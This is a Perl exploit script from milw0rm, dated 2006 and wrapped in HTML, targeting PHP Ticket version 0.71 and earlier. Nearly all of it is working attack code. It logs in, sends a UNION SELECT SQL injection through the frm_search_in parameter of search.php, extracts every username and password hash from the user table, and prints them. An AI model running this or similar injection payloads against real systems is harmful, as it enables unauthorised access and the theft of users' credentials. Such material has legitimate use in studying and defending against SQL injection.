<html><head><title>PHP Ticket <= 0.71 (search.php) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

###############################################################################
#Copyright (C) undefined1_
#
#This program is free software; you can redistribute it and/or
#modify it under the terms of the GNU General Public License
#as published by the Free Software Foundation; either version 2
#of the License, or (at your option) any later version.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program; if not, write to the Free Software
#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#
###############################################################################

use strict; 
use IO::Socket;

$| = 1;
printf &quot;:: php ticket &lt;= 0.71 exploit (privilege escalation) - by undefined1_ @ bash-x.net/undef/ ::\n\n\n&quot;;


my $website = shift || usage();
my $user = shift || usage();
my $password = shift || usage();

my $path = &quot;/&quot;;
my $site = $website;
if(index($website, &quot;/&quot;) != -1)
{
	my $index = index($website, &quot;/&quot;);
	$path = substr($website, $index);
	$site = substr($website, 0, $index);
	if(substr($path, length($path)-1) ne &quot;/&quot;)
	{
		$path .= &quot;/&quot;;
	}
}


my $eop = &quot;\r\nHost: $site\r\n&quot;;
$eop .= &quot;User-Agent: Mozilla/5.0\r\n&quot;;
$eop .= &quot;Connection: close\r\n&quot;;



my $packet1 = &quot;POST &quot;.$path.&quot;search.php HTTP/1.1\r\n&quot;;
my $postdata = &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$postdata .= &quot;Host: $site\r\n&quot;;
$postdata .= &quot;User-Agent: Mozilla/5.0\r\n&quot;;
$postdata .= &quot;Connection: close\r\n&quot;;
$postdata .= &quot;Content-Length: 31\r\n&quot;;
$postdata .= &quot;Cookie: PHPSESSID=aeb241ebabb33d5fb5ba756453f725e8\r\n\r\n&quot;;
$postdata .= &quot;frm_user=&quot;.$user.&quot;&amp;frm_passwd=&quot;.$password;
my $data = sendpacket($site, $packet1.$postdata);



my $packet2 = &quot;POST &quot;.$path.&quot;search.php HTTP/1.1\r\n&quot;;
$postdata = &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$postdata .= &quot;Host: $site\r\n&quot;;
$postdata .= &quot;User-Agent: Mozilla/5.0\r\n&quot;;
$postdata .= &quot;Connection: close\r\n&quot;;
$postdata .= &quot;Content-Length: 215\r\n&quot;;
$postdata .= &quot;Cookie: PHPSESSID=aeb241ebabb33d5fb5ba756453f725e8\r\n\r\n&quot;;
$postdata .= &quot;frm_query=a&amp;frm_search_in=1%3D0+union+all+select+1%2C1%2C1%2C1%2C1%2C1%2CCONCAT%280x30576e656420%2Cuser%2C0x20%2Cpasswd%29%2C1%2C1%2C1%2C1%2C1%2C1+from+user--&amp;frm_ordertype=date&amp;frm_order_desc=DESC&amp;frm_querytype=%25&quot;;
$data = sendpacket($site, $packet2.$postdata);


print &quot;password are encrypted with the PASSWORD() function of mysql\n\n&quot;;

printf(&quot;username%-20spassword\n&quot;, &quot; &quot;);
printf(&quot;--------%-20s--------\n&quot;, &quot; &quot;);
my $index = 0;
while(($index = index($data,&quot;0Wned &quot;, $index)) != -1)
{
	$index += 6;
	my $index2 = index($data,&quot; &quot;, $index);
	my $index3 = index($data,&quot;&lt;/A&gt;&quot;, $index2);
	printf(&quot;%s%-20s%s\n&quot;, substr($data,$index,$index2-$index) , &quot; &quot;, substr($data,$index2+1,$index3-($index2+1)));
	$index = $index3+4;
}


sub sendpacket(\$,\$) {
	my $server = shift;
	my $request = shift;

	my $sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $server, PeerPort =&gt; &quot;80&quot;) or die &quot;[-] Could not connect to $server:80 $!\n&quot;;
	print $sock &quot;$request&quot;;

	
	my $data = &quot;&quot;;
	my $answer;
	while($answer = &lt;$sock&gt;)
	{
		$data .= $answer;
	}
	
	close($sock);
	return $data;
}

sub usage() {
	printf &quot;usage: %s &lt;website&gt; &lt;user&gt; &lt;password&gt;\n&quot;, $0;
	printf &quot;exemple: %s www.site.com/phpticket/\n&quot;, $0;
	exit;
}

# milw0rm.com [2006-03-25]</pre></html>